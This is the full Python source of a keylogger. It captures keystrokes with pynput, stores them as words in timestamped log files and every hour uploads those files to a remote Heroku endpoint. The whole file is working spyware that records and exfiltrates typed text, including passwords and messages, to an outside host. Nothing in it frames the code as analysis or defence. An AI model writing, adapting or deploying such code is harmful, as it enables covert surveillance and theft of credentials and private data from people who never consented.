from datetime import datetime
from pynput.keyboard import Key, Listener
import logging
import os
import threading
import requests

# Constants
MINUTES = 60
SECONDS_PER_MINUTE = 60.0
TOTAL_SECONDS = MINUTES * SECONDS_PER_MINUTE
LOGS_DIRECTORY = "logs/"
HEROKU_API = "https://keylogger-nest.herokuapp.com/upload"


# Class used to manage the global logger
class Logger:
    def __init__(self, logs_directory):
        self.logs_directory = logs_directory
        self.logger = logging.getLogger()
        self.handler = None
        self.logger.setLevel(logging.DEBUG)
        self.created_files = []
        self.last_filepath = None
        self.formatter = logging.Formatter("%(asctime)s: %(message)s")

    # opens a new file for loggging
    def start_new_logging(self):
        if self.has_handler():
            self.remove_current_handler()

        self.last_filepath = self.generate_filepath()
        self.handler = logging.FileHandler(
            self.last_filepath,
            "w",
            encoding="utf-8"
        )
        self.handler.setFormatter(self.formatter)
        self.logger.addHandler(self.handler)

    # Returns true if the logger has a handler
    def has_handler(self):
        return self.handler is not None

    # Remove the current handler assigned to the logger
    def remove_current_handler(self):
        self.logger.removeHandler(self.handler)
        self.created_files.append(self.last_filepath)

    # Generates a filepath based on the current time
    def generate_filepath(self):
        now = datetime.now()
        now_str = now.strftime('%y-%m-%d-%H-%M-%S')
        filepath = self.logs_directory + now_str + ".txt"
        return filepath

    # Logs a text to the logger with the current handler
    def info(self, text):
        self.logger.info(text)

    # Return the lists of files generated from the handlers
    def get_files(self):
        return self.created_files


# Variables
word = ""
my_logger = Logger(LOGS_DIRECTORY)


# Ensure the a directory exists
def ensure_directory_exists():
    os.makedirs(
        os.path.dirname(LOGS_DIRECTORY),
        exist_ok=True
    )


# Return true if the key is a Esc
def isEsc(key):
    return key == Key.esc


# Return true if the key has finished a word
def isWordEndKey(key):
    return (key == Key.enter or
            key == Key.backspace or
            key == Key.space or
            key == Key.tab or
            key == Key.esc)


# Return true if the key is a char
def isChar(key):
    try:
        key.char
        return True
    except:
        return False


# Handler that executes when a user type
def on_key_press(key):
    global my_logger
    global word

    # Logs word if the key is an word end
    if isWordEndKey(key):
        my_logger.info(str(word))
        word = ""

    # Appends character to current word
    if isChar(key):
        keyChar = key.char
        if key.char is None and str(key).startswith('<'):
            num = str(key)[1:-1]
            keyChar = str(int(num) - 96)

        word += str(keyChar)


# Sends files to the api
def save_files_in_storage(filenames):
    for filename in filenames:
        files = {
            'file': open(filename, 'rb')
        }
        response = requests.post(
            HEROKU_API,
            files=files
        )
    return []


# Sends files in an interval of time
def send_files_in_interval():
    global my_logger
    threading.Timer(TOTAL_SECONDS, send_files_in_interval).start()

    my_logger.start_new_logging()
    my_logger.created_files = save_files_in_storage(my_logger.created_files)


def main():
    global my_logger
    ensure_directory_exists()
    my_logger.start_new_logging()
    threading.Timer(TOTAL_SECONDS, send_files_in_interval).start()

    with Listener(on_press=on_key_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()



# Commands
# cd C:\Users\willi\Files\programming\python\keylogger
# .\Scripts\activate
# py src/keylogger.py
